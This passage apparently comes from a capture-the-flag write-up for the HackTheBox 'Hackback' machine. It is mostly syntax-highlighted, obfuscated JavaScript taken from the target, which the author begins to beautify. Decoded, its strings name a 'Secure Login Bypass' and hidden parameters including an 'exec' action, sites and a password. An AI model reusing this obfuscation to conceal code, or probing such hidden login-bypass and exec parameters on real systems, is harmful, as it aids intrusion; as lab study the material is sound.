class="se">\</span><span class="s1">x39</span><span class="se">\</span><span class="s1">x46</span><span class="se">\</span><span class="s1">x38</span><span class="se">\</span><span class="s1">x4f</span><span class="se">\</span><span class="s1">x34</span><span class="se">\</span><span class="s1">x77</span><span class="se">\</span><span class="s1">x71</span><span class="se">\</span><span class="s1">x5a</span><span class="se">\</span><span class="s1">x6e</span><span class="se">\</span><span class="s1">x57</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x4b</span><span class="se">\</span><span class="s1">x68</span><span class="dl">'</span><span class="p">];(</span><span class="kd">function</span><span class="p">(</span><span class="nx">c</span><span class="p">,</span><span class="nx">d</span><span class="p">){</span><span class="kd">var</span> <span class="nx">e</span><span class="o">=</span><span class="kd">function</span><span class="p">(</span><span class="nx">f</span><span class="p">){</span><span class="k">while</span><span class="p">(</span><span class="o">--</span><span class="nx">f</span><span class="p">){</span><span class="nx">c</span><span class="p">[</span><span class="dl">'</span><span class="s1">push</span><span class="dl">'</span><span class="p">](</span><span class="nx">c</span><span class="p">[</span><span class="dl">'</span><span class="s1">shift</span><span class="dl">'</span><span class="p">]());}};</span><span class="nx">e</span><span class="p">(</span><span class="o">++</span><span class="nx">d</span><span class="p">);}(</span><span class="nx">a</span><span class="p">,</span><span class="mh">0x66</span><span class="p">));</span><span class="kd">var</span> <span class="nx">b</span><span class="o">=</span><span class="kd">function</span><span class="p">(</span><span class="nx">c</span><span class="p">,</span><span class="nx">d</span><span class="p">){</span><span class="nx">c</span><span class="o">=</span><span class="nx">c</span><span class="o">-</span><span class="mh">0x0</span><span class="p">;</span><span class="kd">var</span> <span class="nx">e</span><span class="o">=</span><span class="nx">a</span><span class="p">[</span><span class="nx">c</span><span class="p">];</span><span class="k">if</span><span class="p">(</span><span class="nx">b</span><span class="p">[</span><span class="dl">'</span><span class="s1">MsULmv</span><span class="dl">'</span><span class="p">]</span><span class="o">===</span><span class="kc">undefined</span><span class="p">){(</span><span class="kd">function</span><span class="p">(){</span><span class="kd">var</span> <span class="nx">f</span><span class="p">;</span><span class="k">try</span><span class="p">{</span><span class="kd">var</span> <span class="nx">g</span><span class="o">=</span><span class="nb">Function</span><span class="p">(</span><span class="dl">'</span><span class="s1">return</span><span class="se">\</span><span class="s1">x20(function()</span><span class="se">\</span><span class="s1">x20</span><span class="dl">'</span><span class="o">+</span><span class="dl">'</span><span class="s1">{}.constructor(</span><span class="se">\</span><span class="s1">x22return</span><span class="se">\</span><span class="s1">x20this</span><span class="se">\</span><span class="s1">x22)(</span><span class="se">\</span><span class="s1">x20)</span><span class="dl">'</span><span class="o">+</span><span class="dl">'</span><span class="s1">);</span><span class="dl">'</span><span class="p">);</span><span class="nx">f</span><span class="o">=</span><span class="nx">g</span><span class="p">();}</span><span class="k">catch</span><span class="p">(</span><span class="nx">h</span><span class="p">){</span><span class="nx">f</span><span class="o">=</span><span class="nb">window</span><span class="p">;}</span><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="dl">'</span><span class="s1">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=</span><span class="dl">'</span><span class="p">;</span><span class="nx">f</span><span class="p">[</span><span class="dl">'</span><span class="s1">atob</span><span class="dl">'</span><span class="p">]</span><span class="o">||</span><span class="p">(</span><span class="nx">f</span><span class="p">[</span><span class="dl">'</span><span class="s1">atob</span><span class="dl">'</span><span class="p">]</span><span class="o">=</span><span class="kd">function</span><span class="p">(</span><span class="nx">j</span><span class="p">){</span><span class="kd">var</span> <span class="nx">k</span><span class="o">=</span><span class="nb">String</span><span class="p">(</span><span class="nx">j</span><span class="p">)[</span><span class="dl">'</span><span class="s1">replace</span><span class="dl">'</span><span class="p">](</span><span class="sr">/=+$/</span><span class="p">,</span><span class="dl">''</span><span class="p">);</span><span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">l</span><span class="o">=</span><span class="mh">0x0</span><span class="p">,</span><span class="nx">m</span><span class="p">,</span><span class="nx">n</span><span class="p">,</span><span class="nx">o</span><span class="o">=</span><span class="mh">0x0</span><span class="p">,</span><span class="nx">p</span><span class="o">=</span><span class="dl">''</span><span class="p">;</span><span class="nx">n</span><span class="o">=</span><span class="nx">k</span><span class="p">[</span><span class="dl">'</span><span class="s1">charAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">o</span><span class="o">++</span><span class="p">);</span><span class="o">~</span><span class="nx">n</span><span class="o">&amp;&amp;</span><span class="p">(</span><span class="nx">m</span><span class="o">=</span><span class="nx">l</span><span class="o">%</span><span class="mh">0x4</span><span class="p">?</span><span class="nx">m</span><span class="o">*</span><span class="mh">0x40</span><span class="o">+</span><span class="nx">n</span><span class="p">:</span><span class="nx">n</span><span class="p">,</span><span class="nx">l</span><span class="o">++%</span><span class="mh">0x4</span><span class="p">)?</span><span class="nx">p</span><span class="o">+=</span><span class="nb">String</span><span class="p">[</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="mh">0xff</span><span class="o">&amp;</span><span class="nx">m</span><span class="o">&gt;&gt;</span><span class="p">(</span><span class="o">-</span><span class="mh">0x2</span><span class="o">*</span><span class="nx">l</span><span class="o">&amp;</span><span class="mh">0x6</span><span class="p">)):</span><span class="mh">0x0</span><span class="p">){</span><span class="nx">n</span><span class="o">=</span><span class="nx">i</span><span class="p">[</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="nx">n</span><span class="p">);}</span><span class="k">return</span> <span class="nx">p</span><span class="p">;});}());</span><span class="kd">var</span> <span class="nx">q</span><span class="o">=</span><span class="kd">function</span><span class="p">(</span><span class="nx">r</span><span class="p">,</span><span class="nx">d</span><span class="p">){</span><span class="kd">var</span> <span class="nx">t</span><span class="o">=</span><span class="p">[],</span><span class="nx">u</span><span class="o">=</span><span class="mh">0x0</span><span class="p">,</span><span class="nx">v</span><span class="p">,</span><span class="nx">w</span><span class="o">=</span><span class="dl">''</span><span class="p">,</span><span class="nx">x</span><span class="o">=</span><span class="dl">''</span><span class="p">;</span><span class="nx">r</span><span class="o">=</span><span class="nx">atob</span><span class="p">(</span><span class="nx">r</span><span class="p">);</span><span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">y</span><span class="o">=</span><span class="mh">0x0</span><span class="p">,</span><span class="nx">z</span><span class="o">=</span><span class="nx">r</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">];</span><span class="nx">y</span><span class="o">&lt;</span><span class="nx">z</span><span class="p">;</span><span class="nx">y</span><span class="o">++</span><span class="p">){</span><span class="nx">x</span><span class="o">+=</span><span class="dl">'</span><span class="s1">%</span><span class="dl">'</span><span class="o">+</span><span class="p">(</span><span class="dl">'</span><span class="s1">00</span><span class="dl">'</span><span class="o">+</span><span class="nx">r</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">y</span><span class="p">)[</span><span class="dl">'</span><span class="s1">toString</span><span class="dl">'</span><span class="p">](</span><span class="mh">0x10</span><span class="p">))[</span><span class="dl">'</span><span class="s1">slice</span><span class="dl">'</span><span class="p">](</span><span class="o">-</span><span class="mh">0x2</span><span class="p">);}</span><span class="nx">r</span><span class="o">=</span><span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nx">x</span><span class="p">);</span><span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">A</span><span class="o">=</span><span class="mh">0x0</span><span class="p">;</span><span class="nx">A</span><span class="o">&lt;</span><span class="mh">0x100</span><span class="p">;</span><span class="nx">A</span><span class="o">++</span><span class="p">){</span><span class="nx">t</span><span class="p">[</span><span class="nx">A</span><span class="p">]</span><span class="o">=</span><span class="nx">A</span><span class="p">;}</span><span class="k">for</span><span class="p">(</span><span class="nx">A</span><span class="o">=</span><span class="mh">0x0</span><span class="p">;</span><span class="nx">A</span><span class="o">&lt;</span><span class="mh">0x100</span><span class="p">;</span><span class="nx">A</span><span class="o">++</span><span class="p">){</span><span class="nx">u</span><span class="o">=</span><span class="p">(</span><span class="nx">u</span><span class="o">+</span><span class="nx">t</span><span class="p">[</span><span class="nx">A</span><span class="p">]</span><span class="o">+</span><span class="nx">d</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">A</span><span class="o">%</span><span class="nx">d</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">]))</span><span class="o">%</span><span class="mh">0x100</span><span class="p">;</span><span class="nx">v</span><span class="o">=</span><span class="nx">t</span><span class="p">[</span><span class="nx">A</span><span class="p">];</span><span class="nx">t</span><span class="p">[</span><span class="nx">A</span><span class="p">]</span><span class="o">=</span><span class="nx">t</span><span class="p">[</span><span class="nx">u</span><span class="p">];</span><span class="nx">t</span><span class="p">[</span><span class="nx">u</span><span class="p">]</span><span class="o">=</span><span class="nx">v</span><span class="p">;}</span><span class="nx">A</span><span class="o">=</span><span class="mh">0x0</span><span class="p">;</span><span class="nx">u</span><span class="o">=</span><span class="mh">0x0</span><span class="p">;</span><span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">B</span><span class="o">=</span><span class="mh">0x0</span><span class="p">;</span><span class="nx">B</span><span class="o">&lt;</span><span class="nx">r</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">];</span><span class="nx">B</span><span class="o">++</span><span class="p">){</span><span class="nx">A</span><span class="o">=</span><span class="p">(</span><span class="nx">A</span><span class="o">+</span><span class="mh">0x1</span><span class="p">)</span><span class="o">%</span><span class="mh">0x100</span><span class="p">;</span><span class="nx">u</span><span class="o">=</span><span class="p">(</span><span class="nx">u</span><span class="o">+</span><span class="nx">t</span><span class="p">[</span><span class="nx">A</span><span class="p">])</span><span class="o">%</span><span class="mh">0x100</span><span class="p">;</span><span class="nx">v</span><span class="o">=</span><span class="nx">t</span><span class="p">[</span><span class="nx">A</span><span class="p">];</span><span class="nx">t</span><span class="p">[</span><span class="nx">A</span><span class="p">]</span><span class="o">=</span><span class="nx">t</span><span class="p">[</span><span class="nx">u</span><span class="p">];</span><span class="nx">t</span><span class="p">[</span><span class="nx">u</span><span class="p">]</span><span class="o">=</span><span class="nx">v</span><span class="p">;</span><span class="nx">w</span><span class="o">+=</span><span class="nb">String</span><span class="p">[</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="nx">r</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">B</span><span class="p">)</span><span class="o">^</span><span class="nx">t</span><span class="p">[(</span><span class="nx">t</span><span class="p">[</span><span class="nx">A</span><span class="p">]</span><span class="o">+</span><span class="nx">t</span><span class="p">[</span><span class="nx">u</span><span class="p">])</span><span class="o">%</span><span class="mh">0x100</span><span class="p">]);}</span><span class="k">return</span> <span class="nx">w</span><span class="p">;};</span><span class="nx">b</span><span class="p">[</span><span class="dl">'</span><span class="s1">OoACcd</span><span class="dl">'</span><span class="p">]</span><span class="o">=</span><span class="nx">q</span><span class="p">;</span><span class="nx">b</span><span class="p">[</span><span class="dl">'</span><span class="s1">qSLwGk</span><span class="dl">'</span><span class="p">]</span><span class="o">=</span><span class="p">{};</span><span class="nx">b</span><span class="p">[</span><span class="dl">'</span><span class="s1">MsULmv</span><span class="dl">'</span><span class="p">]</span><span class="o">=!!</span><span class="p">[];}</span><span class="kd">var</span> <span class="nx">C</span><span class="o">=</span><span class="nx">b</span><span class="p">[</span><span class="dl">'</span><span class="s1">qSLwGk</span><span class="dl">'</span><span class="p">][</span><span class="nx">c</span><span class="p">];</span><span class="k">if</span><span class="p">(</span><span class="nx">C</span><span class="o">===</span><span class="kc">undefined</span><span class="p">){</span><span class="k">if</span><span class="p">(</span><span class="nx">b</span><span class="p">[</span><span class="dl">'</span><span class="s1">pIjlQB</span><span class="dl">'</span><span class="p">]</span><span class="o">===</span><span class="kc">undefined</span><span class="p">){</span><span class="nx">b</span><span class="p">[</span><span class="dl">'</span><span class="s1">pIjlQB</span><span class="dl">'</span><span class="p">]</span><span class="o">=!!</span><span class="p">[];}</span><span class="nx">e</span><span class="o">=</span><span class="nx">b</span><span class="p">[</span><span class="dl">'</span><span class="s1">OoACcd</span><span class="dl">'</span><span class="p">](</span><span class="nx">e</span><span class="p">,</span><span class="nx">d</span><span class="p">);</span><span class="nx">b</span><span class="p">[</span><span class="dl">'</span><span class="s1">qSLwGk</span><span class="dl">'</span><span class="p">][</span><span class="nx">c</span><span class="p">]</span><span class="o">=</span><span class="nx">e</span><span class="p">;}</span><span class="k">else</span><span class="p">{</span><span class="nx">e</span><span class="o">=</span><span class="nx">C</span><span class="p">;}</span><span class="k">return</span> <span class="nx">e</span><span class="p">;};</span><span class="kd">var</span> <span class="nx">x</span><span class="o">=</span><span class="dl">'</span><span class="se">\</span><span class="s1">x53</span><span class="se">\</span><span class="s1">x65</span><span class="se">\</span><span class="s1">x63</span><span class="se">\</span><span class="s1">x75</span><span class="se">\</span><span class="s1">x72</span><span class="se">\</span><span class="s1">x65</span><span class="se">\</span><span class="s1">x20</span><span class="se">\</span><span class="s1">x4c</span><span class="se">\</span><span class="s1">x6f</span><span class="se">\</span><span class="s1">x67</span><span class="se">\</span><span class="s1">x69</span><span class="se">\</span><span class="s1">x6e</span><span class="se">\</span><span class="s1">x20</span><span class="se">\</span><span class="s1">x42</span><span class="se">\</span><span class="s1">x79</span><span class="se">\</span><span class="s1">x70</span><span class="se">\</span><span class="s1">x61</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x73</span><span class="dl">'</span><span class="p">;</span><span class="kd">var</span> <span class="nx">z</span><span class="o">=</span><span class="nx">b</span><span class="p">(</span><span class="dl">'</span><span class="s1">0x0</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="se">\</span><span class="s1">x50</span><span class="se">\</span><span class="s1">x5d</span><span class="se">\</span><span class="s1">x53</span><span class="se">\</span><span class="s1">x36</span><span class="dl">'</span><span class="p">);</span><span class="kd">var</span> <span class="nx">h</span><span class="o">=</span><span class="nx">b</span><span class="p">(</span><span class="dl">'</span><span class="s1">0x1</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="se">\</span><span class="s1">x72</span><span class="se">\</span><span class="s1">x37</span><span class="se">\</span><span class="s1">x54</span><span class="se">\</span><span class="s1">x59</span><span class="dl">'</span><span class="p">);</span><span class="kd">var</span> <span class="nx">y</span><span class="o">=</span><span class="nx">b</span><span class="p">(</span><span class="dl">'</span><span class="s1">0x2</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="se">\</span><span class="s1">x44</span><span class="se">\</span><span class="s1">x41</span><span class="se">\</span><span class="s1">x71</span><span class="se">\</span><span class="s1">x67</span><span class="dl">'</span><span class="p">);</span><span class="kd">var</span> <span class="nx">t</span><span class="o">=</span><span class="dl">'</span><span class="se">\</span><span class="s1">x3f</span><span class="se">\</span><span class="s1">x61</span><span class="se">\</span><span class="s1">x63</span><span class="se">\</span><span class="s1">x74</span><span class="se">\</span><span class="s1">x69</span><span class="se">\</span><span class="s1">x6f</span><span class="se">\</span><span class="s1">x6e</span><span class="se">\</span><span class="s1">x3d</span><span class="se">\</span><span class="s1">x28</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x68</span><span class="se">\</span><span class="s1">x6f</span><span class="se">\</span><span class="s1">x77</span><span class="se">\</span><span class="s1">x2c</span><span class="se">\</span><span class="s1">x6c</span><span class="se">\</span><span class="s1">x69</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x74</span><span class="se">\</span><span class="s1">x2c</span><span class="se">\</span><span class="s1">x65</span><span class="se">\</span><span class="s1">x78</span><span class="se">\</span><span class="s1">x65</span><span class="se">\</span><span class="s1">x63</span><span class="se">\</span><span class="s1">x2c</span><span class="se">\</span><span class="s1">x69</span><span class="se">\</span><span class="s1">x6e</span><span class="se">\</span><span class="s1">x69</span><span class="se">\</span><span class="s1">x74</span><span class="se">\</span><span class="s1">x29</span><span class="dl">'</span><span class="p">;</span><span class="kd">var</span> <span class="nx">s</span><span class="o">=</span><span class="dl">'</span><span class="se">\</span><span class="s1">x26</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x69</span><span class="se">\</span><span class="s1">x74</span><span class="se">\</span><span class="s1">x65</span><span class="se">\</span><span class="s1">x3d</span><span class="se">\</span><span class="s1">x28</span><span class="se">\</span><span class="s1">x74</span><span class="se">\</span><span class="s1">x77</span><span class="se">\</span><span class="s1">x69</span><span class="se">\</span><span class="s1">x74</span><span class="se">\</span><span class="s1">x74</span><span class="se">\</span><span class="s1">x65</span><span class="se">\</span><span class="s1">x72</span><span class="se">\</span><span class="s1">x2c</span><span class="se">\</span><span class="s1">x70</span><span class="se">\</span><span class="s1">x61</span><span class="se">\</span><span class="s1">x79</span><span class="se">\</span><span class="s1">x70</span><span class="se">\</span><span class="s1">x61</span><span class="se">\</span><span class="s1">x6c</span><span class="se">\</span><span class="s1">x2c</span><span class="se">\</span><span class="s1">x66</span><span class="se">\</span><span class="s1">x61</span><span class="se">\</span><span class="s1">x63</span><span class="se">\</span><span class="s1">x65</span><span class="se">\</span><span class="s1">x62</span><span class="se">\</span><span class="s1">x6f</span><span class="se">\</span><span class="s1">x6f</span><span class="se">\</span><span class="s1">x6b</span><span class="se">\</span><span class="s1">x2c</span><span class="se">\</span><span class="s1">x68</span><span class="se">\</span><span class="s1">x61</span><span class="se">\</span><span class="s1">x63</span><span class="se">\</span><span class="s1">x6b</span><span class="se">\</span><span class="s1">x74</span><span class="se">\</span><span class="s1">x68</span><span class="se">\</span><span class="s1">x65</span><span class="se">\</span><span class="s1">x62</span><span class="se">\</span><span class="s1">x6f</span><span class="se">\</span><span class="s1">x78</span><span class="se">\</span><span class="s1">x29</span><span class="dl">'</span><span class="p">;</span><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="dl">'</span><span class="se">\</span><span class="s1">x26</span><span class="se">\</span><span class="s1">x70</span><span class="se">\</span><span class="s1">x61</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x77</span><span class="se">\</span><span class="s1">x6f</span><span class="se">\</span><span class="s1">x72</span><span class="se">\</span><span class="s1">x64</span><span class="se">\</span><span class="s1">x3d</span><span class="se">\</span><span class="s1">x2a</span><span class="se">\</span><span class="s1">x2a</span><span class="se">\</span><span class="s1">x2a</span><span class="se">\</span><span class="s1">x2a</span><span class="se">\</span><span class="s1">x2a</span><span class="se">\</span><span class="s1">x2a</span><span class="se">\</span><span class="s1">x2a</span><span class="se">\</span><span class="s1">x2a</span><span class="dl">'</span><span class="p">;</span><span class="kd">var</span> <span class="nx">k</span><span class="o">=</span><span class="dl">'</span><span class="se">\</span><span class="s1">x26</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x65</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x69</span><span class="se">\</span><span class="s1">x6f</span><span class="se">\</span><span class="s1">x6e</span><span class="se">\</span><span class="s1">x3d</span><span class="dl">'</span><span class="p">;</span><span class="kd">var</span> <span class="nx">w</span><span class="o">=</span><span class="dl">'</span><span class="se">\</span><span class="s1">x4e</span><span class="se">\</span><span class="s1">x6f</span><span class="se">\</span><span class="s1">x74</span><span class="se">\</span><span class="s1">x68</span><span class="se">\</span><span class="s1">x69</span><span class="se">\</span><span class="s1">x6e</span><span class="se">\</span><span class="s1">x67</span><span class="se">\</span><span class="s1">x20</span><span class="se">\</span><span class="s1">x6d</span><span class="se">\</span><span class="s1">x6f</span><span class="se">\</span><span class="s1">x72</span><span class="se">\</span><span class="s1">x65</span><span class="se">\</span><span class="s1">x20</span><span class="se">\</span><span class="s1">x74</span><span class="se">\</span><span class="s1">x6f</span><span class="se">\</span><span class="s1">x20</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x61</span><span class="se">\</span><span class="s1">x79</span><span class="dl">'</span><span class="p">;</span>
</code></pre></div></div>
<p>Now this is better. I also used a <code class="language-plaintext highlighter-rouge">js</code> beautifier to make it easily readable :
<br><img src="/images/hackthebox/hackback/8.png" alt="" class="align-center"><br><br></p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="p">[</span><span class="dl">'</span><span class="se">\</span><span class="s1">x57</span><span class="se">\</span><span class="s1">x78</span><span class="se">\</span><span class="s1">x49</span><span class="se">\</span><span class="s1">x6a</span><span class="se">\</span><span class="s1">x77</span><span class="se">\</span><span class="s1">x72</span><span class="se">\</span><span class="s1">x37</span><span class="se">\</span><span class="s1">x44</span><span class="se">\</span><span class="s1">x75</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x4f</span><span class="se">\</span><span class="s1">x38</span><span class="se">\</span><span class="s1">x47</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x4b</span><span class="se">\</span><span class="s1">x76</span><span class="se">\</span><span class="s1">x52</span><span class="se">\</span><span class="s1">x77</span><span class="se">\</span><span class="s1">x42</span><span class="se">\</span><span class="s1">x2b</span><span class="se">\</span><span class="s1">x77</span><span class="se">\</span><span class="s1">x71</span><span class="se">\</span><span class="s1">x33</span><span class="se">\</span><span class="s1">x44</span><span class="se">\</span><span class="s1">x75</span><span class="se">\</span><span class="s1">x4d</span><span class="se">\</span><span class="s1">x4b</span><span class="se">\</span><span class="s1">x72</span><span class="se">\</span><span class="s1">x77</span><span class="se">\</span><span class="s1">x72</span><span class="se">\</span><span class="s1">x4c</span><span class="se">\</span><span class="s1">x44</span><span class="se">\</span><span class="s1">x67</span><span class="se">\</span><span class="s1">x63</span><span class="se">\</span><span class="s1">x4f</span><span class="se">\</span><span class="s1">x69</span><span class="se">\</span><span class="s1">x77</span><span class="se">\</span><span class="s1">x72</span><span class="se">\</span><span class="s1">x59</span><span class="se">\</span><span class="s1">x31</span><span class="se">\</span><span class="s1">x4b</span><span class="se">\</span><span class="s1">x45</span><span class="se">\</span><span class="s1">x45</span><span class="se">\</span><span class="s1">x67</span><span class="se">\</span><span class="s1">x47</span><span class="se">\</span><span class="s1">x38</span><span class="se">\</span><span class="s1">x4b</span><span class="se">\</span><span class="s1">x43</span><span class="se">\</span><span class="s1">x77</span><span class="se">\</span><span class="s1">x71</span><span class="se">\</span><span class="s1">x37</span><span class="se">\</span><span class="s1">x44</span><span class="se">\</span><span class="s1">x6c</span><span class="se">\</span><span class="s1">x38</span><span class="se">\</span><span class="s1">x4b</span><span class="se">\</span><span class="s1">x33</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="se">\</span><span class="s1">x41</span><span class="se">\</span><span class="s1">x63</span><span class="se">\</span><span class="s1">x4f</span><span class="se">\</span><span class="s1">x4d</span><span class="se">\</span><span class="s1">x77</span><span class="se">\</span><span class="s1">x71</span><span class="se">\</span><span class="s1">x76</span><span class="se">\</span><span class="s1">x44</span><span class="se">\</span><span class="s1">x71</span><span class="se">\</span><span class="s1">x51</span><span class="se">\</span><span class="s1">x67</span><span class="se">\</span><span class="s1">x43</span><span class="se">\</span><span class="s1">x77</span><span class="se">\</span><span class="s1">x34</span><span class="se">\</span><span class="s1">x2f</span><span class="se">\</span><span class="s1">x43</span><span class="se">\</span><span class="s1">x74</span><span class="se">\</span><span class="s1">x32</span><span class="se">\</span><span class="s1">x6e</span><span class="se">\</span><span class="s1">x44</span><span class="se">\</span><span class="s1">x74</span><span class="se">\</span><span class="s1">x4d</span><span class="se">\</span><span class="s1">x4b</span><span class="se">\</span><span class="s1">x68</span><span class="se">\</span><span class="s1">x5a</span><span class="se">\</span><span class="s1">x63</span><span class="se">\</span><span class="s1">x4b</span><span class="se">\</span><span class="s1">x44</span><span class="se">\</span><span class="s1">x77</span><span class="se">\</span><span class="s1">x71</span><span class="se">\</span><span class="s1">x54</span><span class="se">\</span><span class="s1">x43</span><span class="se">\</span><span class="s1">x70</span><span class="se">\</span><span class="s1">x54</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x79</span><span class="se">\</span><span class="s1">x77</span><span class="se">\</span><span class="s1">x37</span><span class="se">\</span><span class="s1">x6e</span><span class="se">\</span><span class="s1">x43</span><span class="se">\</span><span class="s1">x68</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x4f</span><span class="se">\</span><span class="s1">x51</span><span class="se">\</span><span class="s1">x58</span><span class="se">\</span><span class="s1">x4d</span><span class="se">\</span><span class="s1">x4f</span><span class="se">\</span><span class="s1">x35</span><span class="se">\</span><span class="s1">x57</span><span class="se">\</span><span class="s1">x38</span><span class="se">\</span><span class="s1">x4b</span><span class="se">\</span><span class="s1">x70</span><span class="se">\</span><span class="s1">x44</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x4f</span><span class="se">\</span><span class="s1">x74</span><span class="se">\</span><span class="s1">x4e</span><span class="se">\</span><span class="s1">x43</span><span class="se">\</span><span class="s1">x44</span><span class="se">\</span><span class="s1">x44</span><span class="se">\</span><span class="s1">x76</span><span class="se">\</span><span class="s1">x41</span><span class="se">\</span><span class="s1">x6a</span><span class="se">\</span><span class="s1">x43</span><span class="se">\</span><span class="s1">x67</span><span class="se">\</span><span class="s1">x79</span><span class="se">\</span><span class="s1">x6b</span><span class="se">\</span><span class="s1">x3d</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="se">\</span><span class="s1">x77</span><span class="se">\</span><span class="s1">x35</span><span class="se">\</span><span class="s1">x48</span><span class="se">\</span><span class="s1">x44</span><span class="se">\</span><span class="s1">x72</span><span class="se">\</span><span class="s1">x38</span><span class="se">\</span><span class="s1">x4f</span><span class="se">\</span><span class="s1">x37</span><span class="se">\</span><span class="s1">x64</span><span class="se">\</span><span class="s1">x44</span><span class="se">\</span><span class="s1">x52</span><span class="se">\</span><span class="s1">x6d</span><span class="se">\</span><span class="s1">x4d</span><span class="se">\</span><span class="s1">x4d</span><span class="se">\</span><span class="s1">x4b</span><span class="se">\</span><span class="s1">x4a</span><span class="se">\</span><span class="s1">x77</span><span class="se">\</span><span class="s1">x34</span><span class="se">\</span><span class="s1">x6a</span><span class="se">\</span><span class="s1">x44</span><span class="se">\</span><span class="s1">x6c</span><span class="se">\</span><span class="s1">x56</span><span class="se">\</span><span class="s1">x52</span><span class="se">\</span><span class="s1">x6e</span><span class="se">\</span><span class="s1">x77</span><span class="se">\</span><span class="s1">x72</span><span class="se">\</span><span class="s1">x74</span><span class="se">\</span><span class="s1">x37</span><span class="se">\</span><span class="s1">x77</span><span class="se">\</span><span class="s1">x37</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x30</span><span class="se">\</span><span class="s1">x77</span><span class="se">\</span><span class="s1">x6f</span><span class="se">\</span><span class="s1">x31</span><span class="se">\</span><span class="s1">x61</span><span class="se">\</span><span class="s1">x77</span><span class="se">\</span><span class="s1">x37</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x41</span><span class="se">\</span><span class="s1">x51</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x4b</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x66</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x4f</span><span class="se">\</span><span class="s1">x45</span><span class="se">\</span><span class="s1">x77</span><span class="se">\</span><span class="s1">x34</span><span class="se">\</span><span class="s1">x58</span><span class="se">\</span><span class="s1">x44</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x52</span><span class="se">\</span><span class="s1">x6a</span><span class="se">\</span><span class="s1">x43</span><span class="se">\</span><span class="s1">x6c</span><span class="se">\</span><span class="s1">x4d</span><span class="se">\</span><span class="s1">x4f</span><span class="se">\</span><span class="s1">x77</span><span class="se">\</span><span class="s1">x46</span><span class="se">\</span><span class="s1">x7a</span><span class="se">\</span><span class="s1">x72</span><span class="se">\</span><span class="s1">x43</span><span class="se">\</span><span class="s1">x6d</span><span class="se">\</span><span class="s1">x7a</span><span class="se">\</span><span class="s1">x70</span><span class="se">\</span><span class="s1">x76</span><span class="se">\</span><span class="s1">x43</span><span class="se">\</span><span class="s1">x41</span><span class="se">\</span><span class="s1">x6a</span><span class="se">\</span><span class="s1">x43</span><span class="se">\</span><span class="s1">x75</span><span class="se">\</span><span class="s1">x42</span><span class="se">\</span><span class="s1">x7a</span><span class="se">\</span><span class="s1">x44</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x4b</span><span class="se">\</span><span class="s1">x39</span><span class="se">\</span><span class="s1">x46</span><span class="se">\</span><span class="s1">x38</span><span class="se">\</span><span class="s1">x4f</span><span class="se">\</span><span class="s1">x34</span><span class="se">\</span><span class="s1">x77</span><span class="se">\</span><span class="s1">x71</span><span class="se">\</span><span class="s1">x5a</span><span class="se">\</span><span class="s1">x6e</span><span class="se">\</span><span class="s1">x57</span><span class="se">\</span><span class="s1">x73</span><span class="se">\</span><span class="s1">x4b</span><span class="se">\</span><span class="s1">x68</span><span class="dl">'</span><span class="p">];</span>
<span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">c</span><span class="p">,</span> <span class="nx">d</span><span class="p">)</span> <span class="p">{</span>
